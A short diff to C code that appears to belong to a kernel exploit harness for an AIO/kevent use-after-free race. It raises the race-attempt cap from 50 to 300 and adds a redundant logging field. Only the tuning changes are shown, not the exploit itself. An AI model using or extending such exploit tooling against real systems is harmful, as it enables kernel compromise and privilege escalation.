@@ -343,7 +343,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
         if (++waited > 2000000) break;
     }
     if (s_racer_done != 1) {
-        aio_logx("B1", "att=%d racer fail=%d reclaims=%d", attempt, s_racer_done, s_racer_issued);
+        aio_logx("B1", "att=%d racer fail=%d reclaims=%d issued=%d", attempt, s_racer_done, s_racer_issued, s_racer_issued);
         st->silent++;
         pthread_join(rac, NULL);
         close(kq); close(fd); unlink(path); return 0;
@@ -424,7 +424,7 @@ int nk_aio_uaf_b12(int attempts, nk_aio_stat_t *stat_out)
     nk_rule();
     nk_log("[AIO-B12] aio kevent UAF: attempts=%d, zone=aio_workq_zonep(~224B)", attempts);
     if (attempts <= 0) attempts = 10;
-    if (attempts > 50) attempts = 50;
+    if (attempts > 300) attempts = 300;
 
     nk_aio_stat_t st;
     memset(&st, 0, sizeof(st));
